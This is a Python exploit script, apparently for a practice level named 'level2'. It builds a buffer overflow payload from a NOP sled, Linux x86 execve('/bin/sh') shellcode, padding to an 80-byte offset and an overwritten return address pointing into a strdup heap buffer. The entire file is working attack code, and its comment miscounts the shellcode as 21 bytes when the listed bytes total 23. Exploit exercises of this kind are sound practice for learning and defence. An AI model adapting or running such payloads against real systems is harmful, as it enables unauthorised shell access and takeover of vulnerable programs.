#!/usr/bin/python
import struct, sys

# Our exact offset to return address
OFFSET = 80

# Linux x86 execve("/bin/sh") shellcode - 21 bytes
shellcode = (
    "\x31\xc0"              # xor    eax,eax
    "\x50"                  # push   eax
    "\x68\x2f\x2f\x73\x68"  # push   0x68732f2f ("/sh")
    "\x68\x2f\x62\x69\x6e"  # push   0x6e69622f ("/bin")
    "\x89\xe3"              # mov    ebx,esp
    "\x89\xc1"              # mov    ecx,eax
    "\x89\xc2"              # mov    edx,eax
    "\xb0\x0b"              # mov    al,0xb
    "\xcd\x80"              # int    0x80
)

# Add a NOP sled before the shellcode for reliability
nop_sled = "\x90" * 30
shellcode_with_nops = nop_sled + shellcode

# Calculate padding needed to reach return address
padding_size = OFFSET - len(shellcode_with_nops)
padding = "A" * padding_size

# Return address - this is the heap address where strdup will copy our input
# For level2, typical heap addresses are around 0x0804a000-0x0804a008
ret_addr = 0x0804a008  # This is where strdup allocates - we'll jump to our NOP sled

# Build the final payload
payload = shellcode_with_nops + padding + struct.pack("<I", ret_addr)

# Output the payload
sys.stdout.write(payload)
